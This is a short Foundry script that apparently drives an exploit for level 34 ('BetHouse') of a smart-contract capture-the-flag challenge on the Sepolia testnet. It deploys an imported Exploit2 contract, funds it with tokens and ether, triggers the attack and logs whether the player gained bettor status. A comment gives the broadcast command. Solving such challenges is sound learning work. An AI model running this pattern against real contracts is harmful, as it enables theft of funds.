// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import {Script, console} from "forge-std/Script.sol";
import {BetHouse, Pool, PoolToken, Exploit2} from "src/34.BetHouse.sol";

contract BetHouse2Script is Script {
    function setUp() public {}

    function run() public {
        vm.startBroadcast();

        address instanceAddr = 0xc843987C5b31cdc695Ecc88776da30213775D37a;
        address playerAddr = msg.sender;

        BetHouse betHouse = BetHouse(instanceAddr);

        PoolToken depositToken = PoolToken(Pool(betHouse.pool()).depositToken());

        Exploit2 exploit2 = new Exploit2(instanceAddr, playerAddr);

        depositToken.transfer(address(exploit2), 5);

        exploit2.exploit{value: 0.001 ether}();

        bool isBettor = betHouse.isBettor(playerAddr);
        console.log("Is Bettor:", isBettor);

        vm.stopBroadcast();
    }
}

// forge script script/34.BetHouse2.s.sol --account dev --sender 0x965B0E63e00E7805569ee3B428Cf96330DFc57EF --rpc-url sepolia --slow --broadcast
